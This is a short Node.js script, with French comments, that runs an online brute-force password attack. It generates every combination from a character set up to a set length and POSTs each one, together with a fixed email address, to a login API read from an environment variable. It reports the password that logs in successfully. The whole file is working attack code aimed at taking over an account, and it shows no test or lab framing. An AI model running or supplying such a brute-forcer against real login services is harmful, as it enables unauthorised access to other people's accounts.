import fetch from 'node-fetch';
import chalk from 'chalk';
import 'dotenv/config';

const API_URL = process.env.API_URL;
const email = 'sami@gmail.com';

const lowercase = 'abcdefghijklmnopqrstuvwxyz';
const uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
const digits = '0123456789';
const specials = '!@#$%^&*()_+[]{}|;:,.<>?';

const includeSpecials = true;  // Changez cette valeur à false si vous ne voulez pas inclure les caractères spéciaux

let charset = lowercase + uppercase + digits;
if (includeSpecials) {
    charset += specials;
}

async function bruteForceAttack(password) {
    try {
        const response = await fetch(API_URL, {
            method: 'POST',
            body: JSON.stringify({
                email,
                password
            }),
            headers: {
                'Content-Type': 'application/json'
            }
        });

        if (response.ok) {
            console.log(chalk.green.bold(`Login Successfully Email: ${email}, Password: ${password} valid`));
            return true;
        }

        console.log(chalk.red(`Login Failed, Password ${password} invalid`));
        return false;
    } catch (error) {
        console.log(chalk.red(`Login Failed, Password ${password} invalid, Error: ${error.message}`));
        return false;
    }
}

function* generatePasswords(maxLength) {
    function* helper(currentPassword) {
        if (currentPassword.length === maxLength) return;
        for (let char of charset) {
            const newPassword = currentPassword + char;
            yield newPassword;
            yield* helper(newPassword);
        }
    }
    yield* helper('');
}

async function main() {
    const maxLength = 2; // Changez cette valeur selon la longueur maximale du mot de passe que vous voulez tester

    try {
        for (let password of generatePasswords(maxLength)) {
            if (await bruteForceAttack(password)) break;
        }
    } catch (error) {
        console.log(chalk.red('Error: ', error.message));
    }
}

main();
